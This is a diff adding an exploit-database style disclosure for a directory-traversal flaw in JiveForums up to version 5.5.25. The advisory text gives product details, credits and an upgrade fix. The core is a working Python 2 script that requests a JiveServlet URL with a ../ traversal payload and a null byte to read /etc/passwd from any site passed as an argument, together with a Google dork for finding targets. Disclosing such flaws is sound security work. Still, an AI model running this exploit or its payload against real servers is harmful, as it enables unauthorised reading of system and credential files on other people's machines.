@@ -1,0 +1,61 @@
+'''
+JiveForums <=5.5.25 Directory Traversal Vulnerability
+
+Description
+==========
+Jive forums is a widely recognized network community. Its products have been used by global IT giants including IBM, HP, Oracle, Adobe, Cisco, Intel, Amazon, Emc, Mcafee, Rapid7, Fireeye, etc.
+The version of JiveForums <=5.5.25 and < 4.0 are vulnerable to a directory traversal security issue, other versions may also be affected.
+
+Details
+=======
+Product: JiveSoftware
+Security-Risk: high
+Remote-Exploit: yes
+Vendor-URL: https://www.jivesoftware.com
+
+Credits
+============
+Discovered by: Zhaohuan of Tencent Security
+Site: http://security.tencent.com
+
+Affected Products:
+=================
+Test on  JiveForums 5.5.25/5.5.20/5.5.7/3.2.10/2.6.2
+maybe work <= 5.5.25
+
+Exploit:
+============
+'''
+
+#!/usr/bin/python
+# Author: Zhaohuan || http://weibo.com/hackyou
+# Google Dork: inurl:servlet/JiveServlet
+# Tested on JiveForums 5.5.25/5.5.20/5.5.7/3.2.10/2.6.2
+#
+# Software Link: https://www.jivesoftware.com
+
+import urllib2
+import sys
+
+print "JiveForums <=5.5.25 Directory Traversal Exploit"
+
+if len(sys.argv) != 3:
+    print "[-] Trying exploit on : <site> <path>"
+    print "[*] Usage: %s http://localhost /jiveforums/" % sys.argv[0]
+    sys.exit()
+
+payload = 'servlet/JiveServlet?attachImage=true&attachment=/.././.././.././.././.././.././.././../etc/./passwd%00&contentType=image%2Fpjpeg'
+print "[+] Trying to request :"+sys.argv[1]+sys.argv[2]+payload
+response=urllib2.urlopen(sys.argv[1]+sys.argv[2]+payload)
+readvul=response.read()
+print readvul
+
+
+'''
+Solution:
+============
+Update to jiveforums 5.5.30 or the latest version.
+
+More Information:
+https://www.jivesoftware.com/services-support/
+'''
